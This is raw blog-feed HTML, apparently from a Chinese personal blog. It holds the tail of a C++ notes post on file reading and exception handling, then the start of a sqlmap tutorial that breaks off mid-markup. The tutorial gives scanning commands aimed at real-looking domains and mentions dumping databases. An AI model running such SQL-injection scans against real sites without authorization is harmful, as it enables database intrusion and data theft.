class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">char</span> m_Name[<span class="hljs-number">64</span>];<br><span class="hljs-type">int</span> m_Age;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">ifstream <span class="hljs-title">ifs</span><span class="hljs-params">(<span class="hljs-string">&quot;person.txt&quot;</span>, ios::in | ios::binary)</span></span>;<br><span class="hljs-keyword">if</span> (!ifs.<span class="hljs-built_in">is_open</span>())<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;文件打开失败&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>Person p;<br>ifs.<span class="hljs-built_in">read</span>((<span class="hljs-type">char</span> *)&amp;p, <span class="hljs-built_in">sizeof</span>(p));<br><br>cout &lt;&lt; <span class="hljs-string">&quot;姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="hljs-string">&quot; 年龄： &quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>文件输入流对象 可以通过read函数，以二进制方式读数据</li></ul><h2 id="6-异常处理"><a href="#6-异常处理" class="headerlink" title="6 异常处理"></a>6 异常处理</h2><p>异常是程序在执行期间产生的问题。C++ 异常是指在程序运行时发生的特殊情况，比如尝试除以零的操作。</p><p>异常提供了一种转移程序控制权的方式。C++ 异常处理涉及到三个关键字：<strong>try、catch、throw</strong>。</p><ul><li><strong>throw:</strong> 当问题出现时，程序会抛出一个异常。这是通过使用 <strong>throw</strong> 关键字来完成的。</li><li><strong>catch:</strong> 在您想要处理问题的地方，通过异常处理程序捕获异常。<strong>catch</strong> 关键字用于捕获异常。</li><li><strong>try:</strong> <strong>try</strong> 块中的代码标识将被激活的特定异常。它后面通常跟着一个或多个 catch 块。</li></ul><p>如果有一个块抛出一个异常，捕获异常的方法会使用 <strong>try</strong> 和 <strong>catch</strong> 关键字。try 块中放置可能抛出异常的代码，try 块中的代码被称为保护代码。使用 try&#x2F;catch 语句的语法如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">try</span> &#123;   <span class="hljs-comment">// 保护代码 </span><br>&#125;<span class="hljs-built_in">catch</span>( ExceptionName e1 ) &#123;   <br>    <span class="hljs-comment">// catch 块</span><br>&#125;<span class="hljs-built_in">catch</span>( ExceptionName e2 ) &#123;   <br>    <span class="hljs-comment">// catch 块 </span><br>&#125;<span class="hljs-built_in">catch</span>( ExceptionName eN ) &#123;   <br>    <span class="hljs-comment">// catch 块 </span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果 <strong>try</strong> 块在不同的情境下会抛出不同的异常，这个时候可以尝试罗列多个 <strong>catch</strong> 语句，用于捕获不同类型的异常。</p><h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p>您可以使用 <strong>throw</strong> 语句在代码块中的任何地方抛出异常。throw 语句的操作数可以是任意的表达式，表达式的结果的类型决定了抛出的异常的类型。</p><p>以下是尝试除以零时抛出异常的实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">division</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123; <br><span class="hljs-keyword">if</span>( b == <span class="hljs-number">0</span> )   &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Division by zero condition!&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (a/b);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><p><strong>catch</strong> 块跟在 <strong>try</strong> 块后面，用于捕获异常。您可以指定想要捕捉的异常类型，这是由 catch 关键字后的括号内的异常声明决定的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">try</span> &#123;   <br><span class="hljs-comment">// 保护代码</span><br>&#125;<span class="hljs-built_in">catch</span>( ExceptionName e ) &#123;<br><span class="hljs-comment">// 处理 ExceptionName 异常的代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面的代码会捕获一个类型为 <strong>ExceptionName</strong> 的异常。如果您想让 catch 块能够处理 try 块抛出的任何类型的异常，则必须在异常声明的括号内使用省略号 …，如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">try</span> &#123;   <br><span class="hljs-comment">// 保护代码</span><br>&#125;<span class="hljs-built_in">catch</span>(...) &#123;<br><span class="hljs-comment">// 能处理任何异常的代码 </span><br>&#125;<br></code></pre></td></tr></table></figure><p>下面是一个实例，抛出一个除以零的异常，并在 catch 块中捕获该异常。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">division</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-keyword">if</span>( b == <span class="hljs-number">0</span> )<br>   &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Division by zero condition!&quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">return</span> (a/b);<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-type">int</span> x = <span class="hljs-number">50</span>;<br>   <span class="hljs-type">int</span> y = <span class="hljs-number">0</span>;<br>   <span class="hljs-type">double</span> z = <span class="hljs-number">0</span>;<br> <br>   <span class="hljs-keyword">try</span> &#123;<br>     z = <span class="hljs-built_in">division</span>(x, y);<br>     cout &lt;&lt; z &lt;&lt; endl;<br>   &#125;<span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg) &#123;<br>     cerr &lt;&lt; msg &lt;&lt; endl;<br>   &#125;<br> <br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于我们抛出了一个类型为 <strong>const char*</strong> 的异常，因此，当捕获该异常时，我们必须在 catch 块中使用 const char*。当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Division </span><span class="hljs-keyword">by </span><span class="hljs-built_in">zero</span> condition!<br></code></pre></td></tr></table></figure><h2 id="C-标准的异常"><a href="#C-标准的异常" class="headerlink" title="C++ 标准的异常"></a>C++ 标准的异常</h2><p>C++ 提供了一系列标准的异常，定义在 <strong><exception></strong> 中，我们可以在程序中使用这些标准的异常。它们是以父子类层次结构组织起来的，如下所示：</p><p><img src="/./C-%E7%9F%A5%E8%AF%86%E7%82%B9/exceptions_in_cpp.png" alt="exceptions_in_cpp"></p><img src="/2022/04/24/C-%E7%9F%A5%E8%AF%86%E7%82%B9/exceptions_in_cpp.png" class="" title="C++ 异常的层次结构"><p>下表是对上面层次结构中出现的每个异常的说明：</p><table><thead><tr><th align="left">异常</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>std::exception</strong></td><td align="left">该异常是所有标准 C++ 异常的父类。</td></tr><tr><td align="left">std::bad_alloc</td><td align="left">该异常可以通过 <strong>new</strong> 抛出。</td></tr><tr><td align="left">std::bad_cast</td><td align="left">该异常可以通过 <strong>dynamic_cast</strong> 抛出。</td></tr><tr><td align="left">std::bad_exception</td><td align="left">这在处理 C++ 程序中无法预期的异常时非常有用。</td></tr><tr><td align="left">std::bad_typeid</td><td align="left">该异常可以通过 <strong>typeid</strong> 抛出。</td></tr><tr><td align="left"><strong>std::logic_error</strong></td><td align="left">理论上可以通过读取代码来检测到的异常。</td></tr><tr><td align="left">std::domain_error</td><td align="left">当使用了一个无效的数学域时，会抛出该异常。</td></tr><tr><td align="left">std::invalid_argument</td><td align="left">当使用了无效的参数时，会抛出该异常。</td></tr><tr><td align="left">std::length_error</td><td align="left">当创建了太长的 std::string 时，会抛出该异常。</td></tr><tr><td align="left">std::out_of_range</td><td align="left">该异常可以通过方法抛出，例如 std::vector 和 std::bitset&lt;&gt;::operator<a href=""></a>。</td></tr><tr><td align="left"><strong>std::runtime_error</strong></td><td align="left">理论上不可以通过读取代码来检测到的异常。</td></tr><tr><td align="left">std::overflow_error</td><td align="left">当发生数学上溢时，会抛出该异常。</td></tr><tr><td align="left">std::range_error</td><td align="left">当尝试存储超出范围的值时，会抛出该异常。</td></tr><tr><td align="left">std::underflow_error</td><td align="left">当发生数学下溢时，会抛出该异常。</td></tr></tbody></table><h2 id="定义新的异常"><a href="#定义新的异常" class="headerlink" title="定义新的异常"></a>定义新的异常</h2><p>您可以通过继承和重载 <strong>exception</strong> 类来定义新的异常。下面的实例演示了如何使用 std::exception 类来实现自己的异常：</p><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyException</span> : <span class="hljs-keyword">public</span> exception<br>&#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-title">what</span> <span class="hljs-params">()</span> <span class="hljs-type">const</span> <span class="hljs-title">throw</span> <span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C++ Exception&quot;</span>;<br>  &#125;<br>&#125;;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">try</span><br>  &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-built_in">MyException</span>();<br>  &#125;<br>  <span class="hljs-built_in">catch</span>(MyException&amp; e)<br>  &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;MyException caught&quot;</span> &lt;&lt; std::endl;<br>    std::cout &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;<br>  &#125;<br>  <span class="hljs-built_in">catch</span>(std::exception&amp; e)<br>  &#123;<br>    <span class="hljs-comment">//其他的错误</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这将产生以下结果：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">MyException caught<br>C++ <span class="hljs-keyword">Exception</span><br></code></pre></td></tr></table></figure><p>在这里，<strong>what()</strong> 是异常类提供的一个公共方法，它已被所有子异常类重载。这将返回异常产生的原因。</p><h2 id="noexcept说明符"><a href="#noexcept说明符" class="headerlink" title="noexcept说明符"></a>noexcept说明符</h2><p>在C++11中，我们可以通过noexcept说明某个函数不会抛出异常，形式是关键字noexcept紧跟在函数的参数列表后面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">func1</span><span class="hljs-params">()</span> noexcept;<span class="hljs-comment">//不会抛出异常</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">func2</span><span class="hljs-params">()</span><span class="hljs-comment">//可能抛出异常</span><br></code></pre></td></tr></table></figure><p>noexcept说明符要么出现在函数的所有声明和定义语句中，要么一次也不出现。我们也可以在函数指针的声明和定义中指定noexcept。在typedef或类型别名中不能出现noexcept。在成员函数中，noexcept说明符需要跟在const及引用限定符之后，而在final，override或虚函数的&#x3D;0之前。</p><p>如果一个函数抛出了异常，但是又有noexcept说明符，编译器并不会报错，只是警告而已。一旦一个noexcept函数抛出了异常，程序就会调用terminate以确保遵守不在运行时抛出异常的承诺。因此noexcept用于两种情况下，一种是我们确认函数不会抛出异常，二是我们根本不知道如何处理该异常。</p><p>noexcept说明符接受一个可选的实参，该实参必须能转换为bool类型，如果实参为true，则不会抛出异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">func1</span><span class="hljs-params">()</span> <span class="hljs-title function_">noexcept</span><span class="hljs-params">(<span class="hljs-literal">true</span>)</span>;<span class="hljs-comment">//不会抛出异常</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">func2</span><span class="hljs-params">()</span> <span class="hljs-title function_">noexcept</span><span class="hljs-params">(<span class="hljs-literal">false</span>)</span>;<span class="hljs-comment">//可能抛出异常</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具使用-SQLMAP</title>
      <link href="/2022/04/24/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-SQLMAP/"/>
      <url>/2022/04/24/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-SQLMAP/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SQLMAP 作为SQL注入界自动化检测工具,能够实现高难度漏洞检测, 脱裤等工作,大大减少安全人员的时间.</p><span id="more"></span><h2 id="0x01-用法"><a href="#0x01-用法" class="headerlink" title="0x01 用法"></a>0x01 用法</h2><p>拿到一个工具之前,我们可以用过帮助文档查看它一般的用法. 运行以下命令, 可以查看到详细的帮助:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -hh<br></code></pre></td></tr></table></figure><h3 id="目标选定"><a href="#目标选定" class="headerlink" title="目标选定"></a>目标选定</h3><h4 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://svip.qq.com/abc?d=1&quot;</span><br></code></pre></td></tr></table></figure><p>对指定的URL进行SQL注入检测</p><h4 id="指定GOOGLE搜索的关键字"><a href="#指定GOOGLE搜索的关键字" class="headerlink" title="指定GOOGLE搜索的关键字"></a>指定GOOGLE搜索的关键字</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -g <span class="hljs-string">&#x27;site:&quot;svip.qq.com&quot; filetype:pdf&#x27;</span><br></code></pre></td></tr></table></figure><p>对GOOGLE搜索出来的每一页结果中的链接进行SQL注入检测</p><h4 id="指定BURP或者WebScarab导出文件"><a href="#指定BURP或者WebScarab导出文件" class="headerlink" title="指定BURP或者WebScarab导出文件"></a>指定BURP或者WebScarab导出文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -l ./a.log<br></code></pre></td></tr></table></figure><p>将BURP等安全抓包工具中导出的需要分析的请求进行SQL注入检测</p><h4 id="指定sitemap-xml"><a href="#指定sitemap-xml" class="headerlink" title="指定sitemap.xml"></a>指定sitemap.xml</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -x <span class="hljs-string">&quot;https://m.juzilicai.com/sitemap.xml&quot;</span><br></code></pre></td></tr></table></figure><p>读取指定sitemap.xml文件,并分析其中URL进行SQL注入检测</p><h4 id="指定HTTP请求报文"><a href="#指定HTTP请求报文" class="headerlink" title="指定HTTP请求报文"></a>指定HTTP请求报文</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r ./request.txt<br></code></pre></td></tr></table></figure><p>这个是sqlmap最简单的, 也是最好用的一个用法, sqlmap会去读取这个HTTP请求文件, 从文件中提取出所有HTTP请求相关的参数进行填充, 这样可以为了省去很多参数的配置.</p><h4 id="指定多个请求"><a href="#指定多个请求" class="headerlink" title="指定多个请求"></a>指定多个请求</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -m ./multi.txt<br></code></pre></td></tr></table></figure><p>从文件中读取多个请求进行SQL注入检测</p><h3 id="请求相关的参数"><a href="#请求相关的参数" class="headerlink" title="请求相关的参数"></a>请求相关的参数</h3><h4 id="指定请求方式"><a href="#指定请求方式" class="headerlink" title="指定请求方式"></a>指定请求方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://db.qq.com/test&quot;</span> --method POST<br></code></pre></td></tr></table></figure><p>使用POST请求对URL进行SQL检测</p><h4 id="指定请求的内容"><a href="#指定请求的内容" class="headerlink" title="指定请求的内容"></a>指定请求的内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://db.qq.com/test&quot;</span> --method POST --data <span class="hljs-string">&quot;a=1&amp;b=2&quot;</span><br></code></pre></td></tr></table></figure><p>向指定URL通过POST发送data数据,并且对相关参数进行SQL注入检测, data通常用在POST和PUT请求中</p><h4 id="指定Cookie"><a href="#指定Cookie" class="headerlink" title="指定Cookie"></a>指定Cookie</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://db.qq.com/test&quot;</span> --cookie <span class="hljs-string">&quot;a=1; b=2&quot;</span><br></code></pre></td></tr></table></figure><p>指定Cookie对URL进行SQL注入检测, 一般接口需要登录态, Cookie中存在注入也可以进行检测<br>相关其他参数:</p><ul><li>drop-set-cookie: 忽略响应中Set-Cookie的响应头</li></ul><h4 id="指定User-Agent"><a href="#指定User-Agent" class="headerlink" title="指定User-Agent"></a>指定User-Agent</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --user-agent <span class="hljs-string">&quot;huangjacky1.2&quot;</span><br></code></pre></td></tr></table></figure><p>将HTTP请求头中User-Agent字段设置成指定的内容<br>相关其他参数:</p><ul><li>random-agent: 随机设置浏览器agent字符串</li></ul><h4 id="指定Referer"><a href="#指定Referer" class="headerlink" title="指定Referer"></a>指定Referer</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --referer <span class="hljs-string">&quot;http://a.qq.com&quot;</span><br></code></pre></td></tr></table></figure><p>设置请求头中Referer字段, 很多网站会为了防止CSRF对Referer进行检测, 因此这个字段很多时候需要使用</p><h4 id="指定其他HTTP头"><a href="#指定其他HTTP头" class="headerlink" title="指定其他HTTP头"></a>指定其他HTTP头</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> -H <span class="hljs-string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure><p>设置任意HTTP头后对URL进行SQL注入检测<br>相关其他参数:</p><ul><li>headers: 一次性设置多个头, 头之间用\n进行分隔</li></ul><h4 id="指定超时-重试-间隔"><a href="#指定超时-重试-间隔" class="headerlink" title="指定超时,重试,间隔"></a>指定超时,重试,间隔</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --delay 1 --<span class="hljs-built_in">timeout</span> 15 --retries 2<br></code></pre></td></tr></table></figure><p>针对部分网络情况对请求进行策略调整.</p><ul><li>delay: 请求和请求之间间隔多少秒, 默认没有间隔,可能会被频率控制拦截</li><li>timeout: 请求执行超时时间,单位秒,默认是30s</li><li>retries: 当发生超时时候,是否执行重试, 默认3次</li></ul><h4 id="指定CSRF-TOKEN"><a href="#指定CSRF-TOKEN" class="headerlink" title="指定CSRF TOKEN"></a>指定CSRF TOKEN</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test?a=1&amp;token=1111&quot;</span> --csrf-token token --csrf-url <span class="hljs-string">&quot;http://a.qq.com/token&quot;</span><br></code></pre></td></tr></table></figure><p>告诉SQLmap参数中哪一个参数是token, 这个值需要从什么地方获取</p><ul><li>csrf-token: token的字段名</li><li>csrf-url: 指定URL页面获取token的值</li></ul><h4 id="执行指定的python代码"><a href="#执行指定的python代码" class="headerlink" title="执行指定的python代码"></a>执行指定的python代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test?id=1&amp;hash=xxxxx&quot;</span> --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br></code></pre></td></tr></table></figure><p>当参数之间的逻辑需要特定的方式去实现的时候,我们可以通过eval来写一段python代码来实现.</p><p>其他参数暂时不介绍了,使用不是很多.</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><h4 id="并发线程数"><a href="#并发线程数" class="headerlink" title="并发线程数"></a>并发线程数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --threads 8<br></code></pre></td></tr></table></figure><p>设置请求的线程数, 默认只有1, 最大不能超过10</p><h4 id="长连接"><a href="#长连接" class="headerlink" title="长连接"></a>长连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --keep-alive<br></code></pre></td></tr></table></figure><p>使用HTTP长连接,让请求之间复用HTTP连接,减少TCP连接的消耗</p><h4 id="不获取内容"><a href="#不获取内容" class="headerlink" title="不获取内容"></a>不获取内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --null-connection<br></code></pre></td></tr></table></figure><p>SQLmap只检测响应的字节数,不去获取响应内容, 因为很多时候字节数就可以判断出来是否存在问题</p><h4 id="打开的优化项开关"><a href="#打开的优化项开关" class="headerlink" title="打开的优化项开关"></a>打开的优化项开关</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> -o<br></code></pre></td></tr></table></figure><p>开关打开后,上面优化的选项才能生效. 切记.</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><h4 id="检测和风险等级"><a href="#检测和风险等级" class="headerlink" title="检测和风险等级"></a>检测和风险等级</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --level 5 --risk 3<br></code></pre></td></tr></table></figure><p><strong>level:</strong> 设置检测的方方面面和测试用例, 默认是1,会尝试POST和GET, 2:Cookie也会加入检测, 3:User-Agent和Referer也会检测, 更大的值会增加用例量<br><strong>risk:</strong> 设置测试用例的类型,默认是1, 会使用常见的注入用例,2:加入基于时间的盲注, 3: 增加基于OR的测试用例</p><h4 id="内容检测标准"><a href="#内容检测标准" class="headerlink" title="内容检测标准"></a>内容检测标准</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --string OK --not-string WRONG<br></code></pre></td></tr></table></figure><p>帮助SQLmap识别内容中是否注入成立.</p><ul><li>string: sql为True时候的内容匹配</li><li>not-string: sql为False时候的内容匹配</li><li>regexp: sql为True时候的正则匹配</li><li>code: sql为True的时候响应码</li></ul><p>相关其他参数:</p><ul><li>text-only: 只检测文本内容</li><li>titles: 只检测HTML的title</li></ul><h3 id="注入相关"><a href="#注入相关" class="headerlink" title="注入相关"></a>注入相关</h3><h4 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test?a=1&amp;b=2&quot;</span> --level 2 -p <span class="hljs-string">&#x27;a,user-agent&#x27;</span> --skip b<br></code></pre></td></tr></table></figure><p>默认SQLmap会检测所有相关的参数, 为了效率我们可以指定只检测某些参数,或者不检测那些参数.<br>这些参数除了GET,POST还可以像例子中设置user-agent等请求头.</p><h4 id="指定后端数据库"><a href="#指定后端数据库" class="headerlink" title="指定后端数据库"></a>指定后端数据库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --dbms mysql<br></code></pre></td></tr></table></figure><p>如果能够知道后端数据库的类型后, 我们可以指定类型后,减少无关的测试用例.</p><h4 id="加工脚本"><a href="#加工脚本" class="headerlink" title="加工脚本"></a>加工脚本</h4><figure class="highlight bash"><table><tr><td 